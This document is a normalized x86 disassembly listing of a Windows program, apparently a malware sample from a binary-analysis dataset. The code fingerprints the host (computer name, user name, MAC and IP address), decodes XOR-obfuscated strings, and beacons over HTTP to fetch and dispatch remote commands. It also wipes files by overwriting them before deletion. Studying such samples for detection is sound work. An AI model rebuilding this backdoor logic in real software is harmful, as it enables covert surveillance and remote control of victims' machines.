sub_401000
push ebp
mov ebp esp
push 0xffffffff
push sub_405070
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax 0x1c2c
call sub_404e40
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] esp
push rw-data
mov [ ebp - 0x4 ] ebx
call sub_401bb0
add esp 0x4
push rw-data
call sub_401bb0
add esp 0x4
xor esi esi
push rw-data
call sub_401bb0
add esp 0x4
push rw-data
call sub_401bb0
add esp 0x4
push rw-data
call _strdup
push rw-data
mov [ rw-data ] eax
call sub_401bb0
add esp 0x8
push 0x104
push rw-data
push ebx
call [ GetModuleFileNameA@IAT ]
push 0x5c
push rw-data
call strrchr
mov esi [ PostThreadMessageA@IAT ]
mov edi [ GetCurrentThreadId@IAT ]
mov [ eax ] 0x0
add esp 0x8
mov [ rw-data ] 0x50
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ ebp - 0x1c ] ebx
mov eax esi
shl eax 0x6
add eax rw-data
push eax
call sub_401bb0
add esp 0x4
inc esi
jmp r-xdata
push 0x64
call [ Sleep@IAT ]
jmp r-xdata
push ebx
push ebx
lea ecx [ ebp - 0x54 ]
push ebx
push ecx
call [ GetMessageA@IAT ]
push 0x1
push rw-data
call [ InitializeSecurityDescriptor@IAT ]
push ebx
push ebx
push 0x1
push rw-data
call [ SetSecurityDescriptorDacl@IAT ]
push 0xbb8
mov [ rw-data ] rw-data
mov [ rw-data ] 0xc
mov [ rw-data ] 0x1
call _sleep
mov edx [ rw-data ]
push edx
push rw-data
push rw-data
call sprintf
add esp 0x10
push rw-data
push ebx
push ebx
call [ CreateMutexA@IAT ]
mov esi [ GetLastError@IAT ]
mov [ rw-data ] eax
call esi
cmp eax 0xb7
je r-xdata
cmp esi [ rw-data ]
jge r-xdata
push 0x1
call _sleep
add esp 0x4
push ebx
push ebx
push ebx
call edi
push eax
call esi
cmp eax ebx
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
xor eax eax
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x10
call esi
cmp eax 0x5
je r-xdata
mov [ ebp - 0x14 ] 0x400
call sub_401a50
push rw-data
call sub_401bb0
mov edi rw-data
or ecx 0xffffffff
xor eax eax
add esp 0x4
[ edi ]
not ecx
dec ecx
mov esi ecx
push esi
push rw-data
call sub_401b70
push esi
push rw-data
call sub_404a50
add esp 0x10
mov [ rw-data ] eax
lea eax [ ebp - 0x18 ]
push eax
push 0x20019
push ebx
push rw-data
push 0x80000002
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
mov ebx [ RegQueryValueExA@IAT ]
mov ecx 0x100
lea edi [ ebp - 0x5ac ]
[ edi ]
mov ebx [ RegQueryValueExA@IAT ]
lea ecx [ ebp - 0x14 ]
lea edx [ ebp - 0x5ac ]
push ecx
mov ecx [ ebp - 0x18 ]
lea eax [ ebp - 0x20 ]
push edx
push eax
push 0x0
push rw-data
push ecx
mov [ ebp - 0x14 ] 0x400
call ebx
test eax eax
je r-xdata
push rw-data
mov ecx 0x100
lea edi [ ebp - 0x5ac ]
[ edi ]
lea eax [ ebp - 0x14 ]
lea ecx [ ebp - 0x5ac ]
push eax
mov eax [ ebp - 0x18 ]
lea edx [ ebp - 0x20 ]
push ecx
push edx
push 0x0
push rw-data
push eax
mov [ ebp - 0x14 ] 0x400
call ebx
test eax eax
jne r-xdata
lea eax [ ebp - 0x5ac ]
lea edx [ ebp - 0x5ac ]
lea edx [ ebp - 0x14 ]
lea eax [ ebp - 0x5ac ]
push edx
mov edx [ ebp - 0x18 ]
lea ecx [ ebp - 0x20 ]
push eax
push ecx
push 0x0
push rw-data
push edx
call ebx
test eax eax
je r-xdata
mov edx [ ebp - 0x18 ]
push edx
call esi
lea eax [ ebp - 0x14 ]
mov esi 0x7f
push eax
push rw-data
mov [ ebp - 0x14 ] esi
call [ GetComputerNameA@IAT ]
lea ecx [ ebp - 0x14 ]
mov [ ebp - 0x14 ] esi
push ecx
push rw-data
call [ GetUserNameA@IAT ]
mov al [ rw-data ]
test al al
je r-xdata
mov ecx [ ebp - 0x14 ]
lea edi [ ebp - 0x5ac ]
mov edx ecx
mov [ ebp - 0x14 ] 0x400
shr ecx 0x2
[ edi ]
mov ecx edx
mov edx [ ebp - 0x18 ]
and ecx 0x3
[ edi ]
lea eax [ ebp - 0x14 ]
lea ecx [ ebp - 0x20 ]
push eax
push rw-data
push ecx
push 0x0
push rw-data
push edx
call ebx
test eax eax
je r-xdata
lea ecx [ ebp - 0x5ac ]
push ecx
jmp r-xdata
mov cl [ eax ]
test cl cl
je r-xdata
cmp cl 0x20
je r-xdata
mov [ ebp - 0x5ac ] 0x0
lea edx [ ebp - 0xc3c ]
push edx
push 0x202
call [ WSAStartup@IAT ]
lea eax [ ebp - 0x6ac ]
push 0x100
push eax
mov [ ebp - 0xaac ] 0x0
call [ gethostname@IAT ]
lea ecx [ ebp - 0x6ac ]
push ecx
call [ gethostbyname@IAT ]
test eax eax
mov [ ebp - 0x24 ] eax
je r-xdata
lea edx [ ebp - 0xac ]
push edx
call sub_403f30
mov edi rw-data
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
lea eax [ ebp - 0xac ]
push ecx
push rw-data
push eax
call sub_403f70
lea ecx [ ebp - 0xac ]
lea edx [ ebp - 0x38 ]
push ecx
push edx
call sub_404060
add esp 0x18
xor esi esi
xor edi edi
mov ecx [ ebp - 0x14 ]
xor eax eax
mov edx ecx
lea edi [ ebp - 0x5ac ]
shr ecx 0x2
[ edi ]
mov ecx edx
mov edx [ ebp - 0x18 ]
and ecx 0x3
mov [ ebp - 0x14 ] 0x400
[ edi ]
lea eax [ ebp - 0x14 ]
lea ecx [ ebp - 0x20 ]
push eax
push rw-data
push ecx
push 0x0
push rw-data
push edx
call ebx
test eax eax
je r-xdata
mov [ rw-data ] 0x0
call _strdup
mov edx [ ebp - 0x18 ]
add esp 0x4
mov [ rw-data ] eax
push edx
call esi
lea eax [ ebp - 0x18 ]
push eax
push 0x20019
push 0x0
push rw-data
push 0x80000002
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x5ac ]
mov [ edx ] 0x0
push eax
call _strdup
add esp 0x4
mov [ rw-data ] eax
jmp r-xdata
mov [ edx ] cl
inc edx
inc eax
jmp r-xdata
inc eax
jmp r-xdata
cmp cl 0x9
jne r-xdata
call [ WSACleanup@IAT ]
mov [ rw-data ] 0x0
xor ebx ebx
mov [ rw-data ] 0x0
xor eax eax
lea ecx [ edi + rw-data ]
mov al [ ebp + esi - 0x38 ]
push eax
push rw-data
push 0x20
push ecx
call _snprintf
add esp 0x10
inc esi
add edi 0x2
jmp r-xdata
mov ecx [ ebp - 0x14 ]
xor eax eax
mov edx ecx
lea edi [ ebp - 0x5ac ]
shr ecx 0x2
[ edi ]
mov ecx edx
mov edx [ ebp - 0x18 ]
and ecx 0x3
mov [ ebp - 0x14 ] 0x400
[ edi ]
lea eax [ ebp - 0x14 ]
lea ecx [ ebp - 0x20 ]
push eax
push rw-data
push ecx
push 0x0
push rw-data
push edx
call ebx
test eax eax
je r-xdata
mov ecx [ ebp - 0x18 ]
mov esi [ RegCloseKey@IAT ]
push ecx
call esi
lea edx [ ebp - 0x18 ]
push edx
push 0x20019
push 0x0
push rw-data
push 0x80000002
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
mov cl [ eax ]
test cl cl
je r-xdata
push 0x1
call exit
test eax eax
jne r-xdata
mov ecx [ eax ]
push ecx
call [ inet_ntoa@IAT ]
mov edi eax
or ecx 0xffffffff
xor eax eax
lea edx [ ebp - 0xaac ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea edx [ ebp - 0xaac ]
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
inc ebx
[ edi ] [ esi ]
jmp r-xdata
cmp esi 0x10
jge r-xdata
mov ecx 0x400
xor eax eax
lea edi [ ebp - 0x1c3c ]
push rw-data
[ edi ]
push rw-data
lea eax [ ebp - 0x1c3c ]
push 0x1000
push eax
call _snprintf
lea edi [ ebp - 0x1c3c ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
lea ecx [ ebp - 0x1c3c ]
push ecx
push rw-data
call strncpy
add esp 0x1c
mov edx [ ebp - 0x1c ]
mov ecx [ rw-data ]
mov edx [ rw-data ]
lea eax [ ebp - 0xaac ]
push rw-data
push eax
push rw-data
push rw-data
push ecx
push edx
push rw-data
push rw-data
push rw-data
push rw-data
call sprintf
mov ecx [ rw-data ]
mov edx [ rw-data ]
lea eax [ ebp - 0xaac ]
push rw-data
push eax
push rw-data
push rw-data
push ecx
push edx
push rw-data
push rw-data
push rw-data
push rw-data
call sprintf
add esp 0x50
push rw-data
call _strdup
mov esi eax
or ecx 0xffffffff
mov edi esi
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
push esi
mov [ rw-data ] ecx
call sub_401b70
mov eax [ rw-data ]
push eax
push esi
call sub_404a50
add esp 0x14
mov edi eax
test esi esi
je r-xdata
mov edx [ ebp - 0x24 ]
mov eax [ edx + 0xc ]
mov eax [ eax + ebx * 4 ]
test eax eax
je r-xdata
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov edi rw-data
mov edx ecx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
mov edi rw-data
add edx ecx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
lea esi [ edx + ecx + 0x6 ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov edi edx
mov esi ecx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
mov edi rw-data
add esi ecx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
mov edi rw-data
add esi ecx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
lea esi [ esi + ecx + 0x6 ]
jmp r-xdata
mov edx edi
mov [ ebp - 0x1c ] edx
jmp r-xdata
push esi
call free
add esp 0x4
mov edx [ rw-data ]
push rw-data
push rw-data
push edx
push rw-data
push esi
push ebx
call _snprintf
add esp 0x18
mov ecx [ rw-data ]
push eax
push rw-data
push rw-data
push ecx
push rw-data
push esi
push ebx
call _snprintf
add esp 0x1c
jmp r-xdata
push esi
call malloc
mov ecx esi
mov ebx eax
mov edx ecx
xor eax eax
mov edi ebx
add esp 0x4
shr ecx 0x2
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
mov eax [ ebp - 0x1c ]
test eax eax
je r-xdata
mov edi [ rw-data ]
test edx edx
je r-xdata
mov eax [ rw-data ]
xor edi edi
cmp eax edi
jne r-xdata
shl eax 0x6
or ecx 0xffffffff
lea edi [ eax + rw-data ]
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
xor esi esi
mov eax [ rw-data ]
test eax eax
je r-xdata
cmp ebx edi
je r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
cmp eax ecx
jle r-xdata
mov eax [ rw-data ]
push 0x2
push eax
push rw-data
push ebx
push rw-data
call sub_401c90
add esp 0x14
mov [ ebp - 0x24 ] eax
test eax eax
je r-xdata
cmp [ rw-data ] edi
je r-xdata
push ebx
call free
add esp 0x4
shl eax 0x6
or ecx 0xffffffff
lea edi [ eax + rw-data ]
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi rw-data
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
xor esi esi
mov eax 0x1
mov [ rw-data ] eax
push 0x2710
call _sleep
add esp 0x4
inc esi
jmp r-xdata
push rw-data
push eax
call strstr
add esp 0x8
test eax eax
jne r-xdata
push 0xffffffff
push 0xffffffff
call [ GetCurrentProcess@IAT ]
push eax
call [ SetProcessWorkingSetSize@IAT ]
jmp r-xdata
mov eax [ ebp - 0x1c ]
cmp eax edi
je r-xdata
inc [ rw-data ]
jmp r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
cmp esi 0xa
jge r-xdata
mov eax [ rw-data ]
cmp eax 0x1
jg r-xdata
mov eax [ rw-data ]
cmp eax edi
jne r-xdata
push eax
call free
add esp 0x4
mov ecx [ rw-data ]
push 0x2
push ecx
push rw-data
push ebx
push rw-data
call sub_401c90
add esp 0x14
mov [ ebp - 0x24 ] eax
test eax eax
je r-xdata
cmp eax 0x1
jne r-xdata
lea eax [ ebp - 0x1ac ]
push rw-data
push eax
call sprintf
lea ecx [ ebp - 0x1ac ]
push ecx
call sub_401f70
mov esi eax
add esp 0xc
cmp esi edi
je r-xdata
push 0x2710
call _sleep
add esp 0x4
inc esi
jmp r-xdata
push rw-data
push eax
call strstr
add esp 0x8
test eax eax
je r-xdata
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] edi
test eax eax
je r-xdata
lea eax [ ebp - 0x1ac ]
push rw-data
push eax
call sprintf
lea ecx [ ebp - 0x1ac ]
push ecx
call sub_401f70
mov esi eax
add esp 0xc
cmp esi edi
je r-xdata
jmp r-xdata
cmp esi 0x3
jge r-xdata
mov edx [ rw-data ]
mov [ rw-data ] edx
mov edx [ rw-data ]
push 0x12c
inc edx
mov [ rw-data ] 0x3
mov [ rw-data ] edx
call _sleep
add esp 0x4
push eax
call free
add esp 0x4
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
push esi
call sub_401b70
mov edx [ rw-data ]
push edx
push esi
call sub_404a50
push esi
mov edi eax
call free
add esp 0x14
sub_401a50
mov eax 0x14020
call sub_404e40
push edi
push rw-data
push rw-data
xor edi edi
call sprintf
add esp 0x8
lea eax [ esp + 0x10 ]
lea ecx [ esp + 0x24 ]
mov [ esp + 0x10 ] 0x14000
push eax
push ecx
call GetAdaptersInfo
xor edx edx
mov [ esp + 0x4 ] edx
test eax eax
mov [ esp + 0x8 ] dx
jne r-xdata
pop edi
add esp 0x14020
retn
push esi
lea esi [ esp + 0x28 ]
mov cl [ esi + eax + 0x194 ]
mov dl [ esp + eax + 0x8 ]
xor dl cl
mov [ esp + eax + 0x8 ] dl
inc eax
cmp eax 0x6
jl r-xdata
mov esi [ esi ]
inc edi
test esi esi
je r-xdata
mov edx [ esp + 0xd ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0xb ]
and edx 0xff
and eax 0xff
push edx
mov edx [ esp + 0xe ]
and ecx 0xff
push eax
mov eax [ esp + 0x11 ]
push ecx
mov ecx [ esp + 0x14 ]
and edx 0xff
and eax 0xff
push edx
and ecx 0xff
push eax
push ecx
push rw-data
push rw-data
call sprintf
add esp 0x20
pop esi
cmp edi 0xa
jl r-xdata
xor eax eax
xor ecx ecx
mov al [ esi + 0x199 ]
mov cl [ esi + 0x198 ]
xor edx edx
push eax
mov dl [ esi + 0x197 ]
push ecx
xor eax eax
push edx
mov al [ esi + 0x196 ]
xor ecx ecx
mov cl [ esi + 0x195 ]
xor edx edx
mov dl [ esi + 0x194 ]
push eax
push ecx
push edx
lea eax [ esp + 0x30 ]
push rw-data
push eax
call sprintf
add esp 0x20
xor eax eax
sub_401b70
mov edx [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
test edx edx
mov eax rw-data
jle r-xdata
retn
push ebx
push esi
mov esi edx
mov dl [ eax ]
mov bl [ ecx ]
add dl 0x17
xor bl dl
inc eax
mov [ ecx ] bl
inc ecx
dec esi
jne r-xdata
mov eax rw-data
cmp [ eax ] 0x0
jne r-xdata
pop esi
pop ebx
sub_401bb0
sub esp 0x10
mov al 0x1
mov cl 0x10
mov [ esp ] al
mov [ esp + 0x1 ] al
mov al 0x4
mov [ esp + 0x3 ] cl
mov [ esp + 0x4 ] al
mov [ esp + 0x5 ] al
mov al 0x8
mov [ esp + 0x8 ] cl
mov [ esp + 0x6 ] al
mov [ esp + 0x7 ] al
mov al 0x40
push esi
mov esi [ esp + 0x18 ]
mov [ esp + 0xf ] al
mov [ esp + 0x10 ] al
mov cl 0x20
mov al 0x80
push edi
mov [ esp + 0x12 ] cl
mov [ esp + 0x15 ] cl
mov [ esp + 0x16 ] al
mov [ esp + 0x17 ] al
mov edi esi
or ecx 0xffffffff
xor eax eax
mov dl 0x2
[ edi ]
not ecx
dec ecx
xor edi edi
test ecx ecx
mov [ esp + 0xa ] dl
mov [ esp + 0x11 ] dl
mov [ esp + 0x1c ] ecx
jle r-xdata
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
add ecx 0xfffffffe
cmp [ ecx + esi ] 0x20
jne r-xdata
push ebx
push ebp
mov [ ecx + esi + 0x1 ] 0x0
pop edi
pop esi
add esp 0x10
retn
xor eax eax
not bl
and dl bl
or dl bl
jmp r-xdata
mov [ ecx + esi + 0x1 ] al
pop edi
pop esi
add esp 0x10
retn
mov dl [ ecx + esi - 0x1 ]
dec ecx
cmp dl 0x20
je r-xdata
test [ eax - 0x1 ] cl
mov bl [ eax ]
je r-xdata
mov eax [ esp + 0x24 ]
mov [ edi + esi ] dl
inc edi
cmp edi eax
jl r-xdata
add eax 0x2
dec ebp
jne r-xdata
cmp ecx eax
jle r-xdata
mov cl [ edi + esi ]
xor dl dl
lea eax [ esp + 0x11 ]
mov ebp 0x8
pop ebp
pop ebx
sub_401c90
sub esp 0x10
push ebx
push ebp
push esi
push edi
xor edi edi
mov [ esp + 0x18 ] 0x4
push edi
push edi
push edi
push 0x4
push rw-data
call [ InternetOpenA@IAT ]
mov ebp eax
cmp ebp edi
mov [ esp + 0x10 ] ebp
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x10
retn
mov eax [ esp + 0x30 ]
mov ecx [ esp + 0x2c ]
push edi
push edi
push 0x3
push edi
push edi
push eax
push ecx
push ebp
call [ InternetConnectA@IAT ]
mov ebx eax
cmp ebx edi
mov [ esp + 0x30 ] ebx
jne r-xdata
mov eax [ esp + 0x34 ]
dec eax
je r-xdata
push ebp
call [ InternetCloseHandle@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x10
retn
mov eax [ esp + 0x24 ]
push edi
push 0x4400100
push edi
push edi
push edi
push eax
push rw-data
push ebx
call [ HttpOpenRequestA@IAT ]
mov esi eax
cmp esi edi
jne r-xdata
dec eax
jne r-xdata
push edi
push edi
push edi
mov [ rw-data ] edi
push edi
mov edi [ HttpSendRequestA@IAT ]
push esi
call edi
test eax eax
jne r-xdata
mov esi [ InternetCloseHandle@IAT ]
push ebx
call esi
push ebp
call esi
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x10
retn
mov esi [ esp + 0x24 ]
jmp r-xdata
mov edx [ esp + 0x24 ]
push edi
push 0x4400100
push edi
push edi
push edi
push edx
push rw-data
push ebx
call [ HttpOpenRequestA@IAT ]
mov esi eax
cmp esi edi
jne r-xdata
lea ecx [ esp + 0x18 ]
push 0x0
lea edx [ esp + 0x18 ]
push ecx
push edx
push 0x20000013
push esi
call [ HttpQueryInfoA@IAT ]
mov eax [ esp + 0x14 ]
cmp eax 0x197
je r-xdata
cmp [ rw-data ] 0x3
jge r-xdata
mov ebp [ esp + 0x28 ]
mov [ rw-data ] edi
mov edi ebp
or ecx 0xffffffff
xor eax eax
mov ebx [ HttpSendRequestA@IAT ]
[ edi ]
not ecx
dec ecx
push ecx
push ebp
push eax
push eax
push esi
call ebx
test eax eax
jne r-xdata
mov esi [ InternetCloseHandle@IAT ]
push ebx
call esi
push ebp
call esi
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x10
retn
mov edx [ rw-data ]
push edx
call _sleep
add esp 0x4
test esi esi
je r-xdata
push 0x400
mov [ rw-data ] eax
call malloc
add esp 0x4
mov edi eax
xor ebp ebp
call [ GetLastError@IAT ]
cmp eax 0x2ee2
jne r-xdata
mov ebx [ esp + 0x30 ]
mov ebp [ esp + 0x10 ]
cmp [ rw-data ] 0x3
jge r-xdata
call [ GetLastError@IAT ]
xor eax eax
jmp r-xdata
test edi edi
mov [ rw-data ] 0x0
je r-xdata
mov eax [ esp + 0x1c ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
push 0x0
push 0x0
push 0x0
inc ecx
push 0x0
push esi
mov [ rw-data ] ecx
call edi
test eax eax
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x2ee2
jne r-xdata
push 0x0
push 0x7
push eax
push esi
call [ GetDesktopWindow@IAT ]
push eax
call [ InternetErrorDlg@IAT ]
push esi
mov esi [ InternetCloseHandle@IAT ]
call esi
push ebx
call esi
push ebp
call esi
mov eax [ esp + 0x14 ]
mov [ rw-data ] 0x1
mov [ rw-data ] eax
push esi
mov esi [ InternetCloseHandle@IAT ]
call esi
push ebx
call esi
mov eax [ esp + 0x10 ]
push eax
call esi
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x10
retn
push edi
call free
add esp 0x4
push esi
mov esi [ InternetCloseHandle@IAT ]
mov [ edi + ebp ] 0x0
mov [ rw-data ] ebp
call esi
push ebx
call esi
mov ecx [ esp + 0x10 ]
push ecx
call esi
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
add ebp eax
lea edx [ ebp + 0x400 ]
push edx
push edi
call realloc
add esp 0x8
mov edi eax
jmp r-xdata
jmp r-xdata
mov ecx [ rw-data ]
mov edi ebp
inc ecx
xor eax eax
mov [ rw-data ] ecx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
push ecx
push ebp
push eax
push eax
push esi
call ebx
test eax eax
je r-xdata
lea eax [ esp + 0x1c ]
lea ecx [ edi + ebp ]
push eax
push 0x3ff
push ecx
push esi
call [ InternetReadFile@IAT ]
test eax eax
je r-xdata
sub_401f70
sub esp 0x4c0
push ebx
push ebp
push esi
push edi
mov ecx 0x2b
mov esi rw-data
lea edi [ esp + 0x20 ]
mov ebx [ esp + 0x4d4 ]
[ edi ] [ esi ]
mov edi ebx
or ecx 0xffffffff
xor eax eax
xor ebp ebp
[ edi ]
not ecx
dec ecx
lea edi [ esp + 0x20 ]
mov [ esp + 0x14 ] ecx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
mov edi ebx
mov [ esp + 0x1c ] ecx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
lea edi [ esp + 0x20 ]
mov edx ecx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
mov [ esp + 0x10 ] ebp
lea eax [ edx + ecx + 0x1 ]
push eax
call malloc
mov esi eax
add esp 0x4
cmp esi ebp
jne r-xdata
lea ecx [ esp + 0x20 ]
push ecx
push ebx
push rw-data
push esi
call sprintf
mov ecx [ esp + 0x24 ]
add esp 0x10
xor eax eax
xor ebx ebx
test ecx ecx
mov [ esp + 0x18 ] eax
jle r-xdata
push 0x1
call exit
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
add esp 0x4c0
retn
mov edx [ esp + 0x4d4 ]
mov al [ eax + edx ]
cmp al 0x3b
je r-xdata
lea eax [ esp + 0xcc ]
mov [ esp + ebx + 0xcc ] 0x0
push eax
mov [ esp + 0x14 ] 0x1
xor ebx ebx
call sub_402180
mov ebp eax
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov edi ebp
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov eax [ esp + 0x20 ]
not ecx
dec ecx
add eax edx
lea ecx [ ecx + eax + 0x1 ]
push ecx
push esi
call realloc
mov esi eax
add esp 0xc
test esi esi
je r-xdata
mov [ esp + ebx + 0xcc ] al
inc ebx
jmp r-xdata
push 0x1
call exit
lea edx [ esp + 0x20 ]
push edx
push ebp
push esi
push rw-data
push esi
call sprintf
add esp 0x14
test ebp ebp
je r-xdata
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0x14 ]
inc eax
cmp eax ecx
mov [ esp + 0x18 ] eax
jl r-xdata
push ebp
call free
add esp 0x4
test ebx ebx
jle r-xdata
mov eax [ esp + 0x10 ]
test eax eax
jne r-xdata
lea eax [ esp + 0xcc ]
mov [ esp + ebx + 0xcc ] 0x0
push eax
call sub_402180
mov ebp eax
or ecx 0xffffffff
mov edi ebp
xor eax eax
add esp 0x4
[ edi ]
not ecx
dec ecx
mov [ rw-data ] ecx
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
mov edi ebp
mov edx ecx
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
lea eax [ edx + ecx + 0x1 ]
push eax
push esi
call realloc
add esp 0x8
mov esi eax
test esi esi
push ebp
jne r-xdata
push esi
push rw-data
push esi
push 0x0
push rw-data
push 0x0
jmp r-xdata
mov edi esi
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
mov eax esi
pop edi
dec ecx
pop esi
pop ebp
mov [ rw-data ] ecx
pop ebx
add esp 0x4c0
retn
push ebp
call free
add esp 0x4
call sprintf
add esp 0x10
test ebp ebp
je r-xdata
sub_402180
push ebx
push ebp
mov ebp [ esp + 0xc ]
push esi
push edi
inc ebp
jmp r-xdata
cmp al 0x9
je r-xdata
mov al [ ebp ]
cmp al 0x20
je r-xdata
cmp al 0xa
jne r-xdata
mov edi ebp
or ecx 0xffffffff
xor eax eax
xor edx edx
[ edi ]
not ecx
dec ecx
je r-xdata
pop edi
pop esi
pop ebp
mov eax edx
pop ebx
retn
mov eax [ rw-data ]
xor ebx ebx
test eax eax
je r-xdata
mov eax rw-data
mov esi eax
mov edi [ ebx * 8 + rw-data ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
add ecx ebp
push ecx
call [ ebx * 8 + rw-data ]
add esp 0x4
pop edi
pop esi
pop ebp
pop ebx
retn
mov ecx [ esi + 0x8 ]
add esi 0x8
inc ebx
mov eax esi
test ecx ecx
jne r-xdata
mov edx [ eax ]
or ecx 0xffffffff
mov edi edx
xor eax eax
[ edi ]
not ecx
dec ecx
push ecx
push ebp
push edx
call strncmp
add esp 0xc
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
sub_402220
push ecx
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x18 ]
mov [ esp + 0x10 ] 0x0
push edi
call [ PathFileExistsA@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x8
pop ebx
pop ecx
retn
push rw-data
push edi
call fopen
mov esi eax
add esp 0x8
test esi esi
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x7
pop ebx
pop ecx
retn
mov eax [ esi + 0x10 ]
push eax
call _filelength
push esi
mov ebx eax
call fclose
add esp 0x8
test ebx ebx
jle r-xdata
push edi
call [ DeleteFileA@IAT ]
neg eax
pop edi
pop esi
sbb eax eax
pop ebp
add eax 0x6
pop ebx
pop ecx
retn
push ebx
call malloc
mov ebp eax
add esp 0x4
test ebp ebp
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x4
pop ebx
pop ecx
retn
push rw-data
push edi
call fopen
mov esi eax
add esp 0x8
test esi esi
je r-xdata
push rw-data
push edi
call fopen
mov esi eax
add esp 0x8
test esi esi
je r-xdata
mov ecx ebx
mov eax 0xaaaaaaaa
mov edx ecx
mov edi ebp
shr ecx 0x2
[ edi ]
mov ecx edx
push esi
and ecx 0x3
push ebx
push 0x1
push ebp
[ edi ]
call fwrite
push esi
call fflush
push esi
call fclose
mov edi [ esp + 0x30 ]
add esp 0x18
mov [ esp + 0x10 ] 0x1
mov esi [ esp + 0x10 ]
mov ecx ebx
mov eax 0x55555555
mov edx ecx
mov edi ebp
shr ecx 0x2
[ edi ]
mov ecx edx
push esi
and ecx 0x3
push ebx
push 0x1
push ebp
[ edi ]
call fwrite
push esi
call fflush
push esi
call fclose
mov edi [ esp + 0x30 ]
add esp 0x18
mov esi 0x1
jmp r-xdata
pop edi
pop esi
pop ebp
mov eax 0x3
pop ebx
pop ecx
retn
push edi
call [ DeleteFileA@IAT ]
neg eax
pop edi
pop esi
sbb eax eax
pop ebp
add eax 0x2
pop ebx
pop ecx
retn
push ebp
call free
add esp 0x4
cmp esi 0x1
jne r-xdata
sub_402390
sub esp 0x288
push ebx
push ebp
push esi
push edi
push 0x80
call malloc
mov ebx [ GetDriveTypeA@IAT ]
add esp 0x4
mov edi eax
mov ecx 0x20
xor eax eax
mov [ rw-data ] edi
[ edi ]
mov edi 0x43
mov ebp 0x18
lea eax [ esp + 0x114 ]
push eax
call sub_402ff0
add esp 0x4
cmp esi 0x2
jne r-xdata
push edi
lea eax [ esp + 0x118 ]
push rw-data
push eax
call sprintf
add esp 0xc
lea ecx [ esp + 0x114 ]
push ecx
call ebx
push edi
lea edx [ esp + 0x118 ]
